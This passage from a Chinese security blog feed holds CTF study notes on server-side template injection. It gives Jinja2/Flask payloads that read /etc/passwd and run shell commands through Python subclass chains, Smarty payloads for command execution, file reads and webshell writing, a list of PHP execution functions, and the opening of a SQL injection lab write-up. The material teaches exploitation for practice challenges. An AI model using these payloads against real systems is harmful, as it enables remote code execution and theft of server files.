class="title">click</span>.<span class="title">types</span>.<span class="title">ParamType</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">Option</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">Argument</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">ParsingState</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">parser</span>.<span class="title">OptionParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">formatting</span>.<span class="title">HelpFormatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">BaseCommand</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">core</span>.<span class="title">Parameter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">signals</span>.<span class="title">Namespace</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">signals</span>.<span class="title">_FakeSignal</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">helpers</span>.<span class="title">locked_cached_property</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">helpers</span>.<span class="title">_PackageBoundObject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">cli</span>.<span class="title">DispatchingApp</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">cli</span>.<span class="title">ScriptInfo</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">config</span>.<span class="title">ConfigAttribute</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">_AppCtxGlobals</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">AppContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">ctx</span>.<span class="title">RequestContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">json</span>.<span class="title">tag</span>.<span class="title">JSONTag</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">json</span>.<span class="title">tag</span>.<span class="title">TaggedJSONSerializer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">sessions</span>.<span class="title">SessionInterface</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">json</span>.<span class="title">_JSONModule</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">json</span>.<span class="title">JSONMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">blueprints</span>.<span class="title">BlueprintSetupState</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">WSGIRequestHandler</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">ext</span>.<span class="title">Extension</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">ext</span>.<span class="title">_CommentFinder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">_SSLContext</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">serving</span>.<span class="title">BaseWSGIServer</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">unicodedata</span>.<span class="title">UCD</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">array</span>.<span class="title">array</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">debug</span>.<span class="title">TracebackFrameProxy</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">debug</span>.<span class="title">ProcessedTraceback</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">_TestCookieHeaders</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">_TestCookieResponse</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">EnvironBuilder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">test</span>.<span class="title">Client</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">method</span>-<span class="title">wrapper</span>&#x27;&gt;]</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405151455.png" /></p>
<p>这里存在一个<code>type "file"</code>（python3没有），可以利用： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 40 是 file 在元组中的下标</span></span><br></pre></td></tr></table></figure></p>
<p>读到 <code>/etc/passwd</code> 里的内容。</p>
<h3 id="命令执行">命令执行</h3>
<p>继续看命令执行payload的构造，思路和构造文件读取的一样。</p>
<p>寻找包含os模块的脚本（思路如下） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             <span class="built_in">print</span> num,item</span><br><span class="line">         num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>输出： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-</span><br><span class="line"><span class="number">71</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">site</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">-</span></span><br><span class="line"><span class="class">76 &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>用的是71。</p>
<p>思考怎样用 python 语句获取控制台权限：想到了 <code>os.system</code> 和 <code>os.popen</code></p>
<p>这两句前 者返回<strong>退出状态码</strong> , 只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye。</p>
<p>payload: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;command&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>后者<strong>以 file 形式</strong>返回<strong>输出内容</strong>, 我们想要的是内容。payload: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;command&#x27;</span>).read()</span><br></pre></td></tr></table></figure></p>
<p>这里使用后者来获得本题的flag。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat fl4g&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405152412.png" /></p>
<p>构造paylaod的思路和构造文件读取的是一样的。</p>
<p><strong>常见的子类的引用：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[127].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">sys</span>&#x27;].<span class="title">modules</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125; </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[127].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">popen</span>&#x27;](<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[127].<span class="title">__init__</span>.<span class="title">__globals__</span>。<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">2. &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[2].<span class="title">__subclasses__</span>()[71].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">system</span>(<span class="params"><span class="string">&#x27;command&#x27;</span></span>)&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">3. <span class="title">__import__</span>方法的<span class="title">os</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&quot;&quot;.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span>()[75].<span class="title">__init__</span>.<span class="title">__globals__</span>.<span class="title">__import__</span>(<span class="params"><span class="string">&#x27;os&#x27;</span></span>).<span class="title">popen</span>(<span class="params"><span class="string">&#x27;whoami&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">4. <span class="title">__builtins__</span>  </span></span><br><span class="line"><span class="class">	1. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">	2. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[128].<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">sys</span>&#x27;].<span class="title">modules</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">5. &lt;<span class="title">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;里的<span class="title">__init__</span>.<span class="title">__globals__</span>.<span class="title">__builtins__</span>里面的[&#x27;<span class="title">eval</span>&#x27;]</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;&#123;&#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[75].<span class="title">__init__</span>.<span class="title">__globals__</span>.<span class="title">__builtins__</span>[&#x27;<span class="title">eval</span>&#x27;](<span class="params"><span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span></span>)&#125;&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">6. &#123;&#123;<span class="title">config</span>.<span class="title">__class__</span>.<span class="title">__init__</span>.<span class="title">__globals__</span>[&#x27;<span class="title">os</span>&#x27;].<span class="title">popen</span>(<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="全局变量绕过黑名单">全局变量绕过黑名单</h2>
<p>当flag在变量中时，可以使用这个方法。如果没有黑名单，可以直接即可</p>
<p>有两个函数<code>url_for</code>和<code>get_flashed_messages</code>，这两个函数的引用内容中有<code>current_app</code>全局变量，可以利用全局变量直接读取内容。如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. &#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">2. &#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="题目">题目</h1>
<ol type="1">
<li><a href="https://hdfzzf.icu/2022/04/05/bugku_SSTI_2">bugku_SSTI_2</a></li>
<li><a href="https://hdfzzf.icu/2022/04/05/攻防世界_shrine">攻防世界_shrine</a></li>
<li><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1">攻防世界_easytornado</a></li>
</ol>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Jinjia2</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Smarty模板注入</title>
    <url>/2022/04/05/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
<span id="more"></span>
<h1 id="漏洞确认">漏洞确认</h1>
<p>先通过决策树，判断是否属于smarty：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>然后通过<code>&#123;$smarty.version&#125;</code>判断smarty版本。</p>
<h1 id="漏洞利用">漏洞利用</h1>
<h2 id="常规利用">常规利用</h2>
<p>Smarty支持使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。 在Smarty3的官方手册里有以下描述：</p>
<blockquote>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
</blockquote>
<h2 id="literal-标签">{literal} 标签</h2>
<p>官方手册这样描述这个标签：</p>
<blockquote>
<p><strong><code>&#123;literal&#125;</code>可以让一个模板区域的字符原样输出。</strong> 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
</blockquote>
<p>因此可以利用如下payload实现PHP代码执行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>需要注意的是：<strong>从PHP7开始，这种方法就失效了</strong>。</p>
<h2 id="静态方法">静态方法</h2>
<p><code>$smarty</code>内置变量可用于访问各种环境变量，比如我们使用 <code>self</code> 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。</p>
<p>smarty类中的<code>getStreamVariable()</code> 方法可以获取传入变量的流</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = fgets(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(<span class="variable">$fp</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因此我们可以用这个方法读文件，payload:<br />
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p>然而，这个payload有时候会触发报错，因为这是<strong>旧版本的SSTI的利用方式</strong>，并不适用于新版本的。<strong>而且在3.1.30的Smarty版本中官方已经把该静态方法删除</strong>。</p>
<p><strong>利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</strong></p>
<p>同样：<code>Smarty_Internal_Write_File</code> 这个类中有一个<code>writeFile</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes file in a safe way to disk * * <span class="doctag">@param</span>  string $_filepath complete filepath * <span class="doctag">@param</span>  string $_contents file content * <span class="doctag">@param</span>  Smarty $smarty    smarty instance * * <span class="doctag">@throws</span> SmartyException * <span class="doctag">@return</span> boolean true */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="variable">$_error_reporting</span> = error_reporting();</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$old_umask</span> = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_dirpath</span> = dirname(<span class="variable">$_filepath</span>);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists(<span class="variable">$_dirpath</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$_dirpath</span>, <span class="variable">$smarty</span>-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : <span class="variable">$smarty</span>-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Windows&#x27; rename() fails if the destination exists, * Linux&#x27; rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux&#x27; rename() * seems to be smart enough to handle that for us. */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::<span class="variable">$_IS_WINDOWS</span>) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                    @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod(<span class="variable">$_filepath</span>, <span class="variable">$smarty</span>-&gt;_file_perms);</span><br><span class="line">            umask(<span class="variable">$old_umask</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params"><span class="variable">$varname</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, <span class="variable">$varname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造的payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="if标签">{if}标签</h2>
<p>官方文档中看到这样的描述：</p>
<p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如<code>||*, or, &amp;&amp;, and, is_array(),</code> 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;*</code></p>
<p>payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">格式：&#123;<span class="keyword">if</span> PHP代码&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. &#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 执行phpinfo()</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. &#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 调用system执行系统命令ls</span></span><br></pre></td></tr></table></figure></p>
<h2 id="命令执行">命令执行</h2>
<p>php中的命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀死由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出</span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
<p>linux查看文件的命令：<br />
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat, tac, more, less, head, tail, nl, paste, od, bzmore, bzless</span><br></pre></td></tr></table></figure></p>
<p>php文件读取函数：<br />
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r() fread() fgets() var_dump()</span><br></pre></td></tr></table></figure></p>
<h1 id="题目">题目</h1>
<ol type="1">
<li><a href="https://hdfzzf.icu/2022/04/05/bugku_聪明的PHP/">bugku_聪明的PHP</a></li>
<li><a href="https://hdfzzf.icu/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/">BJDCTF2020 The mystery of ip</a></li>
</ol>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>Redtiger_Hackit_WriteUp</title>
    <url>/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/</url>
    <content><![CDATA[<p>网站：https://redtiger.labs.overthewire.org/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png" /></p>
<span id="more"></span>
<h1 id="level-1">Level-1</h1>
<h2 id="题目描述">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152754.png" /></p>
<p>点击 <code>1</code> 发现 url 出现 <code>cat=1</code> ，并且页面出现了一些变化 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152853.png" /></p>
<p>url: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1</span><br></pre></td></tr></table></figure></p>
<h2 id="测试注入点">测试注入点</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=1=1</span><br><span class="line">?cat=1=2</span><br></pre></td></tr></table></figure>
<p>如上 payload，后者出现 <code>This category does not exist!</code>，而前者正常，说明存在注入点，并且为数字型，即没有闭合方式。</p>
<h2 id="注入过程">注入过程</h2>
